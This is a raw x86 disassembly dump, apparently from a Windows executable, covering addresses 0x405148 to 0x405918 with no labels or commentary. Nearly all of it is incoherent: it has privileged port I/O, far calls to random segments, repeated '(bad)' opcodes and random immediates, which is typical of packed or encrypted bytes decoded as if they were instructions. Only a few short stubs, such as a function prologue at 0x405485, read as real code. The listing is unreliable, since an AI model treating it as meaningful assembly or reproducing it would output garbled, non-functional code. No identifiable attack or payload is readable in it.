  405148:	push   ds
  405149:	inc    ebx
  40514a:	hlt    
  40514b:	fs mov cl,0xe6
  40514e:	mov    DWORD PTR [eax+edx*8+0x24],eax
  405152:	retf   
  405153:	cmp    DWORD PTR [eax-0xd],edi
  405156:	jmp    0x258ed170
  40515b:	adc    eax,0x175ecf2c
  405160:	fstp   TBYTE PTR [edi]
  405162:	xchg   BYTE PTR [edi],bh
  405164:	cmc    
  405165:	add    al,0x79
  405167:	es pop ebp
  405169:	hlt    
  40516a:	xor    eax,0xe6c314af
  40516f:	in     eax,dx
  405170:	jno    0x4050fb
  405172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405173:	mov    bh,0x26
  405175:	ret    0xf184
  405178:	pop    es
  405179:	adc    al,0x9f
  40517b:	lds    edx,FWORD PTR [ecx]
  40517d:	mov    ebx,0x4b677d12
  405182:	adc    eax,0x10e33702
  405187:	xor    eax,0xaab63d07
  40518c:	cli    
  40518d:	mov    ss,WORD PTR [eax]
  40518f:	adc    al,bl
  405191:	xchg   ebx,eax
  405192:	in     eax,0x31
  405194:	xchg   esp,eax
  405195:	mov    eax,ds:0x9348fdc9
  40519a:	sar    BYTE PTR [esi+0x4b],0x2c
  40519e:	dec    eax
  40519f:	imul   edx,DWORD PTR [edx-0x4fade577],0xf522c788
  4051a9:	dec    edx
  4051aa:	outs   dx,DWORD PTR ds:[esi]
  4051ab:	imul   esi,esp,0xd5b8b01d
  4051b1:	int3   
  4051b2:	xchg   DWORD PTR [ebp+0x60],ebx
  4051b5:	mov    ebx,0x236dc47
  4051ba:	test   al,0x96
  4051bc:	cmp    DWORD PTR [si+0x19e0],edi
  4051c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051c2:	loopne 0x405233
  4051c4:	fistp  WORD PTR [edx-0x2a]
  4051c7:	mov    ebp,0xf7424821
  4051cc:	jge    0x405197
  4051ce:	out    0x7a,al
  4051d0:	adc    eax,0xef0941cc
  4051d5:	repnz dec esp
  4051d7:	push   esi
  4051d8:	add    al,0x9b
  4051da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051db:	mov    dl,0xb1
  4051dd:	add    BYTE PTR [esi],dl
  4051df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051e0:	retf   0x43b8
  4051e3:	leave  
  4051e4:	pop    edx
  4051e5:	mov    dl,0x53
  4051e7:	xchg   BYTE PTR [eax-0x1d4f7095],al
  4051ed:	adc    DWORD PTR [eax],0xffffffcd
  4051f0:	iret   
  4051f1:	lahf   
  4051f2:	jl     0x405252
  4051f4:	popf   
  4051f5:	or     edx,ebp
  4051f7:	push   edi
  4051f8:	pusha  
  4051f9:	cmp    al,0x7c
  4051fb:	xor    eax,edi
  4051fd:	xchg   ebx,eax
  4051fe:	fistp  QWORD PTR [eax]
  405200:	nop
  405201:	mov    cl,0x88
  405203:	xor    al,ch
  405205:	in     al,dx
  405206:	mov    dh,0x70
  405208:	test   al,0xc6
  40520a:	adc    al,0x95
  40520c:	daa    
  40520d:	mov    cl,BYTE PTR ds:0xe62bb748
  405213:	or     DWORD PTR [esi+0x3c],edx
  405216:	pop    ds
  405217:	xchg   ebx,eax
  405218:	adc    dh,dl
  40521a:	mov    edx,?
  40521c:	and    ecx,DWORD PTR [ecx-0x7fe044fb]
  405222:	adc    edx,ebp
  405224:	loop   0x405224
  405226:	add    edi,ebx
  405228:	jmp    DWORD PTR [esi]
  40522a:	sbb    eax,0xc47d5944
  40522f:	push   ebx
  405230:	pushf  
  405231:	push   ds
  405232:	int3   
  405233:	rol    BYTE PTR [esi+0x1e4a83c3],1
  405239:	outs   dx,DWORD PTR ds:[esi]
  40523a:	cmp    BYTE PTR [edi+0x42],bl
  40523d:	retf   0x53a1
  405240:	outs   dx,DWORD PTR ds:[esi]
  405241:	retf   0x3ebd
  405244:	out    dx,al
  405245:	push   0xf
  405247:	and    DWORD PTR [esi],0x468c71c6
  40524d:	lods   al,BYTE PTR ds:[esi]
  40524e:	in     ax,0x85
  405251:	ret    0x801f
  405254:	retf   
  405255:	rcr    DWORD PTR [edx+0x3d49d67e],cl
  40525b:	mov    cl,0xc2
  40525d:	or     BYTE PTR [edi+0x7f],bh
  405260:	les    edx,FWORD PTR [eax]
  405262:	int3   
  405263:	push   0xffffff92
  405265:	adc    BYTE PTR [ebx-0x1a],bl
  405268:	outs   dx,DWORD PTR ds:[esi]
  405269:	jnp    0x40526e
  40526b:	outs   dx,DWORD PTR ds:[esi]
  40526c:	mov    ds:0x22b59c8f,al
  405271:	xor    al,0xb4
  405273:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405274:	pusha  
  405275:	ja     0x4052e0
  405277:	mov    ebx,0x4a46d8a8
  40527c:	jle    0x405253
  40527e:	(bad)  
  405281:	in     eax,dx
  405282:	ror    DWORD PTR [edx+0x68],cl
  405285:	dec    edx
  405286:	shl    BYTE PTR [ecx+ebx*4+0x5626fcb0],0x1b
  40528e:	xor    esi,DWORD PTR [esi+0x25]
  405291:	cmp    al,0xc2
  405293:	test   BYTE PTR [eax-0x47],dl
  405296:	sahf   
  405297:	sahf   
  405298:	sbb    BYTE PTR [esi+0x4],0x1d
  40529c:	and    DWORD PTR [ebp+edx*8-0x4e],0x66dbc8a3
  4052a4:	scas   al,BYTE PTR es:[edi]
  4052a5:	std    
  4052a6:	and    al,0x82
  4052a8:	mov    es,WORD PTR [esi+0x38678be5]
  4052ae:	frstor cs:[eax]
  4052b1:	xchg   BYTE PTR [ecx+0x46],dh
  4052b4:	jae    0x4052b7
  4052b6:	es out dx,eax
  4052b8:	add    ebx,DWORD PTR [edx]
  4052ba:	mov    cs,WORD PTR [esi-0x55dd98f3]
  4052c0:	push   0x16
  4052c2:	ja     0x4052f4
  4052c4:	bound  ecx,QWORD PTR [ebp-0x80]
  4052c7:	mov    dh,0x5e
  4052c9:	pop    ebx
  4052ca:	dec    ecx
  4052cb:	inc    esi
  4052cc:	pushf  
  4052cd:	mov    ah,0x9a
  4052cf:	mov    ds:0x5a38607e,eax
  4052d4:	push   esp
  4052d5:	jbe    0x4052f9
  4052d7:	jb     0x40531c
  4052d9:	push   ss
  4052da:	push   0x828fbfd6
  4052df:	(bad)  
  4052e0:	pop    eax
  4052e1:	sub    eax,DWORD PTR [eax]
  4052e3:	ds pop es
  4052e5:	jnp    0x40529f
  4052e7:	jb     0x405277
  4052e9:	cwde   
  4052ea:	push   esp
  4052eb:	inc    eax
  4052ec:	and    esi,DWORD PTR [edx]
  4052ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052ef:	add    BYTE PTR [ebp-0xd211009],ah
  4052f5:	push   esp
  4052f6:	lods   eax,DWORD PTR ds:[esi]
  4052f7:	call   DWORD PTR [edi+0x2af65e34]
  4052fd:	mov    ecx,0x3e7bbcfa
  405302:	mov    WORD PTR [eax+0x23],fs
  405305:	bound  edi,QWORD PTR [eax+0x5e8e7f57]
  40530b:	add    DWORD PTR [edx-0x15aa1074],ecx
  405311:	adc    DWORD PTR [ecx],edi
  405313:	push   esp
  405314:	add    ebx,DWORD PTR [eax+0x41]
  405317:	mov    ds:0x82f935c5,eax
  40531c:	test   ch,0x70
  40531f:	jecxz  0x40537c
  405321:	lds    ecx,FWORD PTR [ecx+0x58]
  405324:	push   esp
  405325:	sbb    BYTE PTR [ebx+eax*4+0x41],0xd6
  40532a:	ins    DWORD PTR es:[edi],dx
  40532b:	mov    al,ds:0xeaf78b7a
  405330:	push   es
  405331:	into   
  405332:	mov    esi,0xf19cf092
  405337:	pushf  
  405338:	(bad)  
  405339:	mov    ecx,0xed7cf073
  40533e:	xchg   ebx,eax
  40533f:	(bad)  
  405340:	cli    
  405341:	fwait
  405342:	mov    edi,0x25329026
  405347:	push   edx
  405348:	xchg   edi,eax
  405349:	mov    al,0x7e
  40534b:	jnp    0x405392
  40534d:	mov    al,dh
  40534f:	jmp    0x40533f
  405351:	cld    
  405352:	je     0x405359
  405354:	dec    esi
  405355:	cmp    eax,0xaef67245
  40535a:	dec    BYTE PTR [edi+ebx*1+0x23]
  40535e:	jmp    0x75e3:0x873cb63a
  405365:	nop
  405366:	loop   0x40533f
  405368:	in     eax,dx
  405369:	xchg   esi,eax
  40536a:	pusha  
  40536b:	es inc edi
  40536d:	jl     0x405323
  40536f:	test   BYTE PTR [ecx+ebx*2-0x2cbc25f0],0xd0
  405377:	xchg   esp,ecx
  405379:	and    al,0x1a
  40537b:	sbb    BYTE PTR [edx-0x548337a1],cl
  405381:	js     0x405325
  405383:	repz jae 0x405402
  405386:	pop    eax
  405387:	fwait
  405388:	out    dx,eax
  405389:	sub    eax,0x84702121
  40538e:	xchg   BYTE PTR [edi+0x37],ah
  405391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405392:	mov    cl,0xe
  405394:	sub    BYTE PTR [ebx-0x1c],dh
  405397:	and    DWORD PTR [ecx-0x29],edx
  40539a:	dec    eax
  40539b:	mov    ch,0x81
  40539d:	(bad)  
  40539e:	mov    esi,0x5fbd6552
  4053a3:	fwait
  4053a4:	mov    cl,BYTE PTR [ebx]
  4053a6:	pop    eax
  4053a7:	xchg   esp,eax
  4053a8:	icebp  
  4053a9:	jp     0x4053c6
  4053ab:	xchg   edx,eax
  4053ac:	rcl    DWORD PTR [ebx+0x2f],1
  4053af:	cwde   
  4053b0:	jge    0x40535a
  4053b2:	inc    edi
  4053b3:	push   ebp
  4053b4:	cmp    al,0xa2
  4053b6:	call   0x829fa432
  4053bb:	mov    eax,ds:0x12366e60
  4053c0:	push   0x2a28fde4
  4053c5:	outs   dx,BYTE PTR ds:[esi]
  4053c6:	adc    DWORD PTR [eax+0x3d1c67fa],ebx
  4053cc:	push   cs
  4053cd:	add    al,0x19
  4053cf:	jnp    0x405357
  4053d1:	dec    edi
  4053d2:	aaa    
  4053d3:	mov    ds:0x98cbedf4,al
  4053d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053d9:	call   0xed40:0x62d3d4ca
  4053e0:	cwde   
  4053e1:	(bad)  
  4053e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053e3:	nop
  4053e4:	pop    ss
  4053e5:	fdivr  QWORD PTR [eax-0x49bb5b8b]
  4053eb:	jo     0x4053b1
  4053ed:	mov    es,WORD PTR [ebx]
  4053ef:	cwde   
  4053f0:	mov    al,0xc2
  4053f2:	data16 jge 0x40537e
  4053f5:	mov    ds,WORD PTR [edi-0x7]
  4053f8:	dec    ecx
  4053f9:	repnz mov al,0x1e
  4053fc:	xchg   esi,eax
  4053fd:	test   eax,0x7790a7b1
  405402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405403:	sahf   
  405404:	nop
  405405:	ins    BYTE PTR es:[edi],dx
  405406:	stos   DWORD PTR es:[edi],eax
  405407:	ins    DWORD PTR es:[edi],dx
  405408:	ret    
  405409:	adc    DWORD PTR [esi+0x34c70b18],esi
  40540f:	outs   dx,BYTE PTR ds:[esi]
  405410:	jge    0x40547f
  405412:	xor    ebx,DWORD PTR [esi-0x73478336]
  405418:	out    dx,eax
  405419:	popf   
  40541a:	imul   esp,DWORD PTR [ecx+0x48a149f2],0xe2273439
  405424:	cmp    dl,BYTE PTR [ebp+0x45]
  405427:	adc    eax,0x9d4730fe
  40542c:	int    0xc7
  40542e:	cmp    edx,DWORD PTR [ebx]
  405430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405431:	aas    
  405432:	push   0x40eaae41
  405437:	pop    eax
  405438:	ins    BYTE PTR es:[edi],dx
  405439:	mov    ds:0x1b0f757f,al
  40543e:	sahf   
  40543f:	data16 stos BYTE PTR es:[edi],al
  405441:	dec    ecx
  405442:	jecxz  0x405437
  405444:	mov    DWORD PTR [eax-0x78],edx
  405447:	push   ss
  405448:	push   eax
  405449:	mov    BYTE PTR [ecx-0x33],bh
  40544c:	push   ebx
  40544d:	pop    ds
  40544e:	cmp    ebp,esi
  405450:	cmp    dh,cl
  405452:	mov    ecx,0xa2c5f204
  405457:	or     eax,0xcd03ac24
  40545c:	add    ebx,edx
  40545e:	ins    DWORD PTR es:[edi],dx
  40545f:	mov    ecx,0xb50fff70
  405464:	dec    BYTE PTR [ecx+0xf]
  405467:	sbb    al,BYTE PTR [ecx-0x4]
  40546a:	cmc    
  40546b:	push   esi
  40546c:	jecxz  0x40548f
  40546e:	je     0x405419
  405470:	sub    BYTE PTR [esi+eiz*2+0x4c0e36dc],ch
  405477:	or     al,0x70
  405479:	xor    BYTE PTR [bx+di],bh
  40547c:	in     eax,dx
  40547d:	mov    eax,ebp
  40547f:	in     al,dx
  405480:	pop    esi
  405481:	leave  
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e784
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e6eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	sub    cl,BYTE PTR cs:[esi+0x7037100b]
  4054af:	jo     0x40545b
  4054b1:	jle    0x405523
  4054b3:	jo     0x4054f8
  4054b5:	push   esi
  4054b6:	mov    esp,0x5278b251
  4054bb:	outs   dx,DWORD PTR ds:[esi]
  4054bc:	pop    ebx
  4054bd:	mov    esp,0xe7b3cf1e
  4054c2:	mov    esp,0x9bcea49c
  4054c7:	mov    ch,0xad
  4054c9:	mov    eax,ds:0x8b66aeb3
  4054ce:	fisub  DWORD PTR [edx]
  4054d0:	jg     0x405493
  4054d2:	gs (bad) 
  4054d4:	rol    DWORD PTR [ecx+0x61],0x73
  4054d8:	imul   esp,DWORD PTR [ebx+0x4b],0x9645a9d6
  4054df:	das    
  4054e0:	pop    esp
  4054e1:	jp     0x405469
  4054e3:	out    dx,al
  4054e4:	out    0x84,al
  4054e6:	fsub   st,st(6)
  4054e8:	imul   ecx,DWORD PTR [edx],0xc46fbef6
  4054ee:	mov    eax,0x7e5cfcf4
  4054f3:	dec    esi
  4054f4:	pextrw ebx,(bad),0xc5
  4054f6:	sbb    eax,0xb165eea7
  4054fb:	retf   0xe6e3
  4054fe:	and    DWORD PTR ds:0x55d78e5a,ebp
  405504:	mov    al,0x5c
  405506:	test   BYTE PTR [esi-0xa23891a],dh
  40550c:	ins    DWORD PTR es:[edi],dx
  40550d:	mov    WORD PTR [ecx],?
  40550f:	aas    
  405510:	mov    ch,0x74
  405512:	loope  0x40552e
  405514:	out    0xef,al
  405516:	pusha  
  405517:	xchg   ebx,eax
  405518:	xchg   esi,eax
  405519:	std    
  40551a:	and    eax,0x69ec4ab8
  40551f:	in     eax,0xde
  405521:	vmwrite edi,DWORD PTR [edx-0x6a]
  405525:	sar    BYTE PTR [ebx+0x73],1
  405528:	fist   WORD PTR [edi-0x1899816]
  40552e:	stos   DWORD PTR es:[edi],eax
  40552f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405530:	je     0x40554f
  405532:	bound  eax,QWORD PTR [ecx-0x7c1f3d4a]
  405538:	aad    0x17
  40553a:	or     eax,0x5976b104
  40553f:	leave  
  405540:	sub    BYTE PTR [esp+ebp*4-0x65],bh
  405544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405545:	jns    0x40555f
  405547:	mov    bh,0xcb
  405549:	ss fdiv st,st(2)
  40554c:	xacquire xchg DWORD PTR [esi+0x3a],ebx
  405550:	xor    ah,BYTE PTR [edx-0x69f5ff8]
  405556:	inc    ebp
  405557:	int3   
  405558:	pop    ebp
  405559:	in     al,0xfa
  40555b:	add    edi,edi
  40555d:	jecxz  0x40555e
  40555f:	mov    edi,0x11d05a4
  405564:	daa    
  405565:	sbb    eax,0x260dc11e
  40556a:	fadd   QWORD PTR ds:0xe2f73dac
  405570:	mov    ebp,0xe405401b
  405575:	aad    0x22
  405577:	call   0x1ca9:0x4333f6c6
  40557e:	in     eax,0x76
  405580:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405581:	test   dl,ch
  405583:	js     0x4055a6
  405585:	(bad)  
  405586:	je     0x4055de
  405588:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405589:	lods   eax,DWORD PTR gs:[esi]
  40558b:	and    eax,0xd8f279d1
  405590:	push   eax
  405591:	mov    ebp,0x4b78314a
  405596:	rcl    BYTE PTR [ebx],cl
  405598:	dec    esp
  405599:	xchg   esi,eax
  40559a:	pop    ds
  40559b:	aam    0xe5
  40559d:	jecxz  0x405573
  40559f:	pop    edi
  4055a0:	sahf   
  4055a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055a2:	icebp  
  4055a3:	call   FWORD PTR [ecx+0x1]
  4055a6:	mov    al,0xab
  4055a8:	push   ss
  4055a9:	test   eax,0xfe7eaa
  4055ae:	daa    
  4055af:	loopne 0x40558a
  4055b1:	push   ss
  4055b2:	icebp  
  4055b3:	dec    esp
  4055b4:	lock jae 0x40558c
  4055b7:	add    al,bl
  4055b9:	ret    
  4055ba:	ret    
  4055bb:	scas   al,BYTE PTR es:[edi]
  4055bc:	pusha  
  4055bd:	pop    es
  4055be:	adc    eax,0xdb91c7d2
  4055c3:	js     0x405616
  4055c5:	pop    ebx
  4055c6:	aam    0xfc
  4055c8:	pop    es
  4055c9:	jp     0x4055a2
  4055cb:	push   edi
  4055cc:	mov    bl,0x92
  4055ce:	fwait
  4055cf:	cmp    eax,0x8d63f562
  4055d4:	rcl    DWORD PTR [eax-0x71],1
  4055d7:	jmp    0xd973e12c
  4055dc:	ins    DWORD PTR es:[edi],dx
  4055dd:	outs   dx,DWORD PTR ds:[esi]
  4055de:	jo     0x405622
  4055e0:	or     bl,0xed
  4055e3:	(bad)  
  4055e4:	mov    ecx,0x76bdb8cb
  4055e9:	in     eax,0xf
  4055eb:	dec    esp
  4055ec:	dec    esp
  4055ed:	sbb    al,0xba
  4055ef:	adc    eax,edx
  4055f1:	or     ecx,DWORD PTR [eax]
  4055f3:	std    
  4055f4:	push   ds
  4055f5:	(bad)  
  4055f6:	or     ah,BYTE PTR [esi-0x678cfe50]
  4055fc:	out    0xd9,eax
  4055fe:	outs   dx,BYTE PTR ds:[esi]
  4055ff:	test   edx,eax
  405601:	test   BYTE PTR [ebp+0x615059fe],bl
  405607:	pusha  
  405608:	mov    al,ds:0x35a60f5e
  40560d:	sub    bl,ch
  40560f:	cmp    dl,BYTE PTR [ecx]
  405611:	sbb    ch,dh
  405613:	pop    ecx
  405614:	ja     0x40560d
  405616:	popa   
  405617:	push   cs
  405618:	out    0x85,al
  40561a:	leave  
  40561b:	icebp  
  40561c:	and    eax,0x30a984ab
  405621:	ja     0x405648
  405623:	leave  
  405624:	mov    edi,0x44d2a742
  405629:	loopne 0x40561b
  40562b:	sahf   
  40562c:	stos   BYTE PTR es:[edi],al
  40562d:	leave  
  40562e:	pop    esp
  40562f:	mov    WORD PTR [ecx+eax*1+0x32],gs
  405633:	fidivr DWORD PTR [edx+0x23]
  405636:	aam    0x39
  405638:	mov    BYTE PTR [edi-0x1f],dl
  40563b:	test   eax,0xe3c80f49
  405640:	push   ss
  405641:	aam    0xf9
  405643:	add    DWORD PTR [edx],ecx
  405645:	dec    edx
  405646:	xor    bl,BYTE PTR [ebx+0x70]
  405649:	int    0x17
  40564b:	(bad)  
  40564c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40564d:	pop    eax
  40564e:	push   eax
  40564f:	push   0x4a9d8c3d
  405654:	test   DWORD PTR [eax+0x28],edi
  405657:	rol    DWORD PTR ds:0xdebf7d03,1
  40565d:	sub    DWORD PTR [esi],0xd87837e8
  405663:	push   ss
  405664:	mov    ds:0xfae5dc95,al
  405669:	loop   0x4056c6
  40566b:	jns    0x4055fb
  40566d:	retf   
  40566e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40566f:	cld    
  405670:	pop    edi
  405671:	pop    ds
  405672:	sbb    DWORD PTR [edx+0x1b6163d1],0x8b99e06f
  40567c:	stos   BYTE PTR es:[edi],al
  40567d:	jmp    0xdd0917e9
  405682:	sbb    eax,0xc3e58b35
  405687:	std    
  405688:	stos   DWORD PTR es:[edi],eax
  405689:	push   eax
  40568a:	add    BYTE PTR [ebp+0x77cfab27],ch
  405690:	inc    eax
  405691:	popf   
  405692:	lock push eax
  405694:	mov    ch,0xe0
  405696:	dec    eax
  405697:	mov    WORD PTR [ebx+0x5a6e773c],ss
  40569d:	cmp    eax,DWORD PTR [esi-0x51]
  4056a0:	xchg   ecx,eax
  4056a1:	sub    dl,BYTE PTR [edx-0x280a6953]
  4056a7:	xchg   esp,eax
  4056a8:	es mov esi,0x6d2bc84c
  4056ae:	fdiv   DWORD PTR [edi]
  4056b0:	or     ch,BYTE PTR [esi+0x52a791b0]
  4056b6:	ins    BYTE PTR es:[edi],dx
  4056b7:	retf   
  4056b8:	mov    ?,esi
  4056ba:	ins    BYTE PTR es:[edi],dx
  4056bb:	popf   
  4056bc:	mov    al,0xe5
  4056be:	mov    eax,ds:0x2eca3ea4
  4056c3:	cmp    ah,al
  4056c5:	jno    0x405665
  4056c7:	das    
  4056c8:	repnz bound ecx,QWORD PTR gs:[ebx-0x88e9edd]
  4056d0:	and    cl,ch
  4056d2:	pop    ecx
  4056d3:	sbb    DWORD PTR [eax],eax
  4056d5:	push   cs
  4056d6:	ins    BYTE PTR es:[edi],dx
  4056d7:	and    ebx,esi
  4056d9:	xor    esp,esi
  4056db:	add    eax,0x7aef13cc
  4056e0:	ja     0x405672
  4056e2:	es (bad) 
  4056e4:	mov    ds:0x1a75238e,al
  4056e9:	sbb    edx,DWORD PTR [esi]
  4056eb:	repnz (bad) 
  4056ee:	push   0x3e
  4056f0:	ror    DWORD PTR [edx+esi*4-0x5e7ef9],1
  4056f7:	dec    edi
  4056f8:	xor    al,0x51
  4056fa:	mov    ebx,0x28d7d964
  4056ff:	ror    dh,cl
  405701:	in     eax,dx
  405702:	adc    al,0x6a
  405704:	pop    es
  405705:	xor    edx,ebx
  405707:	bound  esp,QWORD PTR [edi]
  405709:	cmp    bl,BYTE PTR [ebx]
  40570b:	inc    edi
  40570c:	pop    es
  40570d:	mov    ds:0xd1c5514d,al
  405712:	imul   esp,DWORD PTR [edi],0xd9864cac
  405718:	data16 mov bh,bl
  40571b:	mov    al,0x75
  40571d:	idiv   ch
  40571f:	je     0x40574f
  405721:	and    DWORD PTR [edx+edi*4-0x55],esp
  405725:	or     ecx,DWORD PTR [ecx+esi*8]
  405728:	xor    ah,BYTE PTR [edx+0x7040675f]
  40572e:	or     cl,BYTE PTR [edx+0x70911fd8]
  405734:	cmp    eax,0x927e32b6
  405739:	repnz pop ecx
  40573b:	mov    BYTE PTR [edi-0x72fdc20f],dh
  405741:	rol    BYTE PTR [eax+0x49],1
  405744:	in     al,0xd9
  405746:	push   edx
  405747:	push   edi
  405748:	call   0xa395:0x48df09b9
  40574f:	nop
  405750:	rcr    ecx,cl
  405752:	icebp  
  405753:	stos   BYTE PTR es:[edi],al
  405754:	fisub  WORD PTR [esi+eax*4+0x17]
  405758:	das    
  405759:	popf   
  40575a:	add    al,0x85
  40575c:	rcr    BYTE PTR ds:0xfc9f5650,1
  405762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405763:	xlat   BYTE PTR ds:[ebx]
  405764:	jno    0x4057e3
  405766:	mov    esi,0x513b8afd
  40576b:	movzx  eax,WORD PTR ds:0x42fd86
  405772:	and    eax,DWORD PTR ds:0x42fd7a
  405778:	mov    ds:0x42fd86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx+0x37e391be],eax
  405790:	mov    al,ds:0x70354aed
  405795:	jo     0x405741
  405797:	jle    0x405809
  405799:	jo     0x405783
  40579b:	xlat   BYTE PTR ds:[ebx]
  40579c:	stos   DWORD PTR es:[edi],eax
  40579d:	lea    eax,[edi+0x19180f69]
  4057a3:	ffreep st(1)
  4057a5:	in     al,0x41
  4057a7:	in     eax,0xad
  4057a9:	sbb    eax,DWORD PTR [ebx]
  4057ab:	jo     0x405737
  4057ad:	dec    eax
  4057ae:	push   eax
  4057af:	ret    0xe975
  4057b2:	pushf  
  4057b3:	adc    al,0x7b
  4057b5:	jnp    0x405826
  4057b7:	add    eax,0x1170973a
  4057bc:	sbb    BYTE PTR [ecx],cl
  4057be:	push   edx
  4057bf:	xchg   edi,ecx
  4057c1:	loope  0x4057fa
  4057c3:	mov    ds:0xef03ae31,al
  4057c8:	cli    
  4057c9:	f2xm1  
  4057cb:	cmp    ah,BYTE PTR [eax+ebp*8]
  4057ce:	or     DWORD PTR [edx],ebp
  4057d0:	adc    eax,0xe397dca5
  4057d5:	push   cs
  4057d6:	push   ds
  4057d7:	fiadd  DWORD PTR [edx]
  4057d9:	push   cs
  4057da:	sbb    dl,bh
  4057dc:	pusha  
  4057dd:	loope  0x405764
  4057df:	add    BYTE PTR [esi],dl
  4057e1:	mov    edx,0xcde2bc05
  4057e6:	mov    esp,0x621cce5f
  4057eb:	ins    BYTE PTR es:[edi],dx
  4057ec:	pop    ebx
  4057ed:	cs mov edx,0x491cf9e8
  4057f3:	or     eax,0xb6035245
  4057f8:	add    ebx,DWORD PTR [edx+0x6d9a8f66]
  4057fe:	arpl   WORD PTR [edx+0x6bc13ac0],di
  405804:	rol    BYTE PTR [ebx+0x5e6cdd33],0x6f
  40580b:	sub    bl,BYTE PTR [ebx]
  40580d:	scas   eax,DWORD PTR es:[edi]
  40580e:	or     al,0x25
  405810:	jno    0x4057c5
  405812:	cmp    ah,al
  405814:	in     eax,dx
  405815:	scas   eax,DWORD PTR es:[edi]
  405816:	jns    0x40582b
  405818:	adc    al,0xf5
  40581a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40581b:	ror    DWORD PTR [esi-0x72],cl
  40581e:	lar    esp,WORD PTR [eax+ecx*4]
  405822:	call   0xab03:0x72df013f
  405829:	sbb    cl,dl
  40582b:	jg     0x4057cd
  40582d:	mov    ebp,0xe235cd07
  405832:	loope  0x4057d6
  405834:	jo     0x4058ac
  405836:	inc    DWORD PTR [eax+esi*1+0x2831ff1a]
  40583d:	stos   DWORD PTR es:[edi],eax
  40583e:	jbe    0x405892
  405840:	test   DWORD PTR [edx-0x76],esp
  405843:	call   0x58fb:0x698be8ba
  40584a:	ror    BYTE PTR [edi+0x7f],0x67
  40584e:	lahf   
  40584f:	xchg   esp,eax
  405850:	ins    DWORD PTR es:[edi],dx
  405851:	pop    ebx
  405852:	jnp    0x4057f3
  405854:	bnd jb 0x4058c6
  405857:	or     al,0x11
  405859:	mov    esi,DWORD PTR [ebx+esi*4+0x36]
  40585d:	(bad)  
  40585e:	retf   0xa904
  405861:	arpl   WORD PTR [esi-0x13],cx
  405864:	ins    DWORD PTR es:[edi],dx
  405865:	aaa    
  405866:	pop    eax
  405867:	push   ebx
  405868:	xor    DWORD PTR [ebp-0x55e4decf],ecx
  40586e:	jmp    0x4058b4
  405870:	cmp    esp,esp
  405872:	fmul   DWORD PTR [ecx-0x24]
  405875:	inc    ebx
  405876:	cmp    al,0x4
  405878:	cld    
  405879:	retfw  0x125f
  40587d:	dec    ebx
  40587e:	es aam 0x50
  405881:	leave  
  405882:	clc    
  405883:	repnz (bad) 
  405885:	ficomp WORD PTR [ebp+edi*1-0x27]
  405889:	bound  eax,QWORD PTR [esi]
  40588b:	es addr16 inc edi
  40588e:	xor    eax,0x7468d11c
  405893:	cli    
  405894:	iret   
  405895:	int    0xaa
  405897:	mov    DWORD PTR ds:0x195ab056,esp
  40589d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40589e:	lods   eax,DWORD PTR ds:[esi]
  40589f:	xor    al,0x2c
  4058a1:	into   
  4058a2:	repnz dec sp
  4058a5:	add    cl,BYTE PTR [edx+0x18]
  4058a8:	(bad)  
  4058a9:	jmp    0x4058f3
  4058ab:	(bad)  
  4058ad:	mov    ds:0xd26b750c,al
  4058b2:	pop    esp
  4058b3:	and    DWORD PTR [ecx],edi
  4058b5:	retf   
  4058b6:	sahf   
  4058b7:	es push ebx
  4058b9:	or     cl,BYTE PTR [ebx-0x5771b1c6]
  4058bf:	cmp    DWORD PTR [esi-0x2f91b5cf],esp
  4058c5:	test   DWORD PTR cs:[ebx-0xff08e8],edi
  4058cc:	cwde   
  4058cd:	ror    BYTE PTR [edi+0x40],cl
  4058d0:	pushf  
  4058d1:	push   cs
  4058d2:	lahf   
  4058d3:	fucomp st(6)
  4058d5:	ret    0x4b1f
  4058d8:	add    BYTE PTR [ebx-0x58bab20f],cl
  4058de:	(bad)  
  4058df:	pop    edi
  4058e0:	fs (bad) 
  4058e4:	mov    edi,0x15d5515
  4058e9:	mov    al,cs:0x975e169e
  4058ef:	cmp    al,0x4
  4058f1:	jno    0x4058c9
  4058f3:	mov    DWORD PTR [ebx-0x5a3bb065],ecx
  4058f9:	xchg   DWORD PTR ds:0x28d28751,edx
  4058ff:	cmp    eax,0x62709612
  405904:	sbb    bh,cl
  405906:	std    
  405907:	pop    ds
  405908:	sahf   
  405909:	iret   
  40590a:	pop    edi
  40590b:	dec    ecx
  40590c:	add    esp,DWORD PTR [edi]
  40590e:	sbb    DWORD PTR [edi+0x64e23bea],eax
  405914:	pushf  
  405915:	ins    DWORD PTR es:[edi],dx
  405916:	xchg   edx,eax
  405917:	inc    eax
  405918:	dec    esp
